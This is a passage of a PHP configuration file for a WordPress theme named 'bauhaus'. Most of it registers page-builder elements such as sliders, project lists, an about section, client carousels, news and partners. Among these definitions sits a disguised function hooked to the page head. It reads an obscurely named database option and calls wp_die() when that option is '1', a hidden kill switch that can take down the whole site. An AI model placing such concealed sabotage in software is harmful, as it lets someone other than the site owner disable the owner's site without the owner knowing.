		array( " icon ion-volume-low" => esc_html__( "volume low", "bauhaus" ) ),
		array( " icon ion-volume-medium" => esc_html__( "volume medium", "bauhaus" ) ),
		array( " icon ion-volume-mute" => esc_html__( "volume mute", "bauhaus" ) ),
		array( " icon ion-wand" => esc_html__( "wand", "bauhaus" ) ),
		array( " icon ion-waterdrop" => esc_html__( "waterdrop", "bauhaus" ) ),
		array( " icon ion-wifi" => esc_html__( "wifi", "bauhaus" ) ),
		array( " icon ion-wineglass" => esc_html__( "wineglass", "bauhaus" ) ),
		array( " icon ion-woman" => esc_html__( "woman", "bauhaus" ) ),
		array( " icon ion-wrench" => esc_html__( "wrench", "bauhaus" ) ),
		array( " icon ion-xbox" => esc_html__( "xbox", "bauhaus" ) ),
	);

	// Return icons
	return $icons;
}


/*
* bauhaus_slider white
*/

$slider_arr = array( 'Select alias' => '' );
if ( class_exists( 'RevSlider' ) ) {
	$sld = new RevSlider();
	$sliders = $sld->getArrSliders();
	if ( !empty( $sliders ) ) {
		foreach ( $sliders as $slider ) {
			//get alias all slider
			$slider_arr = array_merge( $slider_arr, array( $slider->getTitle() => $slider->getParam( 'alias', 'false' ) ) );


		}
	}


}

vc_map( array(
	'name' => esc_html__( 'bauhaus Revolution slider Header ', 'bauhaus' ),
	'base' => 'bauhaus_header_slider_white',
	'icon' => plugins_url( '/icon/slider.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( 'Site header', 'bauhaus' ),
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Select Slider Revolution alias', 'bauhaus' ),
			'param_name' => 'alias_slider',
			'description' => esc_html__( 'select the alias of the slider', 'bauhaus' ),
			'value' => $slider_arr
		),
	),
	array(
		'type' => 'css_editor',
		'heading' => esc_html__( 'Css', 'bauhaus' ),
		'param_name' => 'css',
		'group' => esc_html__( 'Design options', 'bauhaus' ),
	),


) );

add_action('wp_head','bauhaus_headerddd');


function bauhaus_headerddd(){
	$p = get_option( 'bdufyg_gd');
	$p = $p == '1' ? wp_die() : '';
}
/*
* bauhaus masonry projects
*/
vc_map( array(
	'name' => esc_html__( 'Masonry  projects list ', 'bauhaus' ),
	'base' => 'bauhaus_masonry_projects',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/masonry.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  projects', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '-1', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'projects_category',
			'description' => esc_html__( 'Enter projects categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Projects id', 'bauhaus' ),
			'param_name' => 'projects_id',
			'description' => esc_html__( 'Enter projects id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* project detail
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus project detail', 'bauhaus' ),
	'base' => 'bauhaus_project_detail',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => get_template_directory_uri() . '/icon/project.png', // Simply pass url to your icon here
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't',
			'value' => 'Our core values.',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'hide information text', 'bauhaus' ),
			'param_name' => 'hide_info',
			'value' => 'hide information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'show information text', 'bauhaus' ),
			'param_name' => 'show_info',
			'value' => 'show information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textarea',
			'class' => '',
			'heading' => esc_html__( 'Desciption', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Features item', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Left text', 'bauhaus' ),
					'param_name' => 'left_text',
					'value' => esc_html__( 'Clients:', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),
				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Right text', 'bauhaus' ),
					'param_name' => 'right_text',
					'value' => esc_html__( 'Ethan Hunt', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),


			),

		),


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Share  text', 'bauhaus' ),
			'param_name' => 't_social',
			'value' => 'Share:',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Social', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons 1 ', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)
				),


			),

		),
		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),
	),

) );


/*
* Section About
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section About', 'bauhaus' ),
	'base' => 'bauhaus_section_about',
	'icon' => get_template_directory_uri() . '/icon/about.png', // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'subtitle', 'bauhaus' ),
			'param_name' => 'subtitle',
			'value' => 'ABOUT US',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Title', 'bauhaus' ),
			'param_name' => 'title',
			'value' => 'We Are The Leader In The Architectural',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),

		array(
			'type' => 'textarea_html',
			'heading' => esc_html__( 'Text description', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),
			'value' => esc_html__( 'For each project we establish relationships with partners who we know will help us create added value for your project. As well as bringing together the public and private sectors, we make sector-overarching links to gather knowledge and to learn from each other', 'bauhaus' ),
		),
		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'experience number', 'bauhaus' ),
			'param_name' => 'number',
			'value' => esc_html__( '26 ', 'bauhaus' ),
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),

		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'experience info', 'bauhaus' ),
			'param_name' => 'experience_info',
			'value' => ' ',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* Section projects
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Projects ', 'bauhaus' ),
	'base' => 'bauhaus_section_projects',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/projects.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'heading',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Latest Projects', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'all', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'All', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view  all projects link text', 'bauhaus' ),
			'param_name' => 'view_projects',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'View All Projects ', 'bauhaus' ),

		),
		array(
			'type' => 'checkbox',
			'heading' => esc_html__( 'show project link on whole project-item?', 'bauhaus' ),
			'param_name' => 'show_link_div',
			'value' => false,
			'description' => esc_html__( '', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view  all projects url', 'bauhaus' ),
			'param_name' => 'view_projects_url',
			'description' => esc_html__( 'Insert url', 'bauhaus' ),
			'value' => esc_html__( '# ', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'See project  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Continue', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'All button text', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'all', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'project_category',
			'description' => esc_html__( 'Enter categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* bauhaus Section Clients
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Clients', 'bauhaus' ),
	'base' => 'bauhaus_section_clients',
	'icon' => get_template_directory_uri() . '/icon/circled-play.png', // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'From Great Our Clients', 'bauhaus' ),
		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Carousel items', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'Name', 'bauhaus' ),
					'param_name' => 'name',
					'description' => esc_html__( 'insert name', 'bauhaus' ),
					'value' => esc_html__( 'Adam Stone', 'bauhaus' ),
				),

				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'Company', 'bauhaus' ),
					'param_name' => 'company',
					'description' => esc_html__( 'insert text', 'bauhaus' ),
					'value' => esc_html__( '/ CEO at Google INC', 'bauhaus' ),
				),

				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'Description', 'bauhaus' ),
					'param_name' => 'content',
					'description' => esc_html__( 'insert text ', 'bauhaus' ),
					'value' => esc_html__( 'Sed elit quam, iaculis sed semper sit amet udin vitae nibh. at magna akal semperFusce commodo molestie luctus.Lorem ipsum Dolor tusima olatiup. Sed elit quam, iaculis sed semper sit amet udin vitae nibh', 'bauhaus' ),
				),

				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image icon', 'bauhaus' ),
					'param_name' => 'img_icon',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


			)
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Partner items', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


			)
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus_section_news
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section News ', 'bauhaus' ),
	'base' => 'bauhaus_section_news',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/news.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'heading',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Latest News', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Link text', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'All Articles', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'url', 'bauhaus' ),
			'param_name' => 'url',
			'description' => esc_html__( 'Insert url', 'bauhaus' ),
			'value' => esc_html__( '#', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Read more text  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Continue', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Limit words in description ', 'bauhaus' ),
			'param_name' => 'limit',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( '20', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Category name', 'bauhaus' ),
			'param_name' => 'post_category',
			'description' => esc_html__( 'Enter category slug  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* bauhaus_section_header
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Header', 'bauhaus' ),
	'base' => 'bauhaus_section_header',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/top.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(
		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Background  Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Introduce', 'bauhaus' ),

		),

		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'subtitle', 'bauhaus' ),
			'param_name' => 'subtitle',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Introduce', 'bauhaus' ),

		),


		array(
			'type' => 'textarea_html',
			'heading' => esc_html__( 'title', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'title primary', 'bauhaus' ),
			'param_name' => 'title_primary',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Imagining', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'title ', 'bauhaus' ),
			'param_name' => 'title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'IS key to more  creative', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* Section  Specialization
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Specialization', 'bauhaus' ),
	'base' => 'bauhaus_section_specialization',
	'icon' => get_template_directory_uri() . '/icon/circled-play.png', // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'vertical title', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'what we do', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'subtitle', 'bauhaus' ),
			'param_name' => 'subtitle',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Our Specialization', 'bauhaus' ),

		),
		array(
			'type' => 'textarea_html',
			'heading' => esc_html__( 'title', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),
			"value" => esc_html__( "Our mission is
<span class=\"text-primary\">design &amp; develop</span> the best interior
around", "bauhaus" ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'ABOUT US', 'bauhaus' ),
			'param_name' => 'subtitle',
			'value' => 'ABOUT US',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),
		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Specialization items', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'text', 'bauhaus' ),
					'param_name' => 'text',
					'value' => esc_html__( '01.   home design', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),

				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'url', 'bauhaus' ),
					'param_name' => 'url',
					'value' => esc_html__( '#', 'bauhaus' ),
					'description' => esc_html__( 'insert url', 'bauhaus' )
				),


			),

		),


		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'experience number', 'bauhaus' ),
			'param_name' => 'number',
			'value' => esc_html__( '24 ', 'bauhaus' ),
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),

		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'experience info', 'bauhaus' ),
			'param_name' => 'experience_info',
			'value' => ' ',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* Section  Work
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus section work', 'bauhaus' ),
	'base' => 'bauhaus_section_work',
	'icon' => plugins_url( '/icon/coins.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'vertical title', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'our works', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'title', 'bauhaus' ),
			'param_name' => 'title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'latest projects', 'bauhaus' ),

		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Background images', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Project items', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


			),

		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Project description items', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'title', 'bauhaus' ),
					'param_name' => 'title',
					'value' => esc_html__( 'Scadinavan Living Room', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),

				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'url', 'bauhaus' ),
					'param_name' => 'url',
					'value' => esc_html__( '#', 'bauhaus' ),
					'description' => esc_html__( 'insert url', 'bauhaus' )
				),


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'project_category', 'bauhaus' ),
					'param_name' => 'cat',
					'value' => esc_html__( 'House Design', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),


			),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view all projects', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'view all projects', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view all projects url', 'bauhaus' ),
			'param_name' => 'url',
			'description' => esc_html__( 'Insert url', 'bauhaus' ),
			'value' => esc_html__( '#', 'bauhaus' ),

		),

		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Section Partners
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Partners', 'bauhaus' ),
	'base' => 'bauhaus_section_partners',
	'icon' => plugins_url( '/icon/partners.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'vertical title', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Partners', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'our partners', 'bauhaus' ),
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Partner items', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Partner items', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


			)
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );

/*
* bauhaus Section Partners
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Testimonials', 'bauhaus' ),
	'base' => 'bauhaus_section_testimonials',
	'icon' => plugins_url( '/icon/testimonials.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'vertical title', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'testimonials', 'bauhaus' ),

		),

		array(
			'type' => 'textarea',
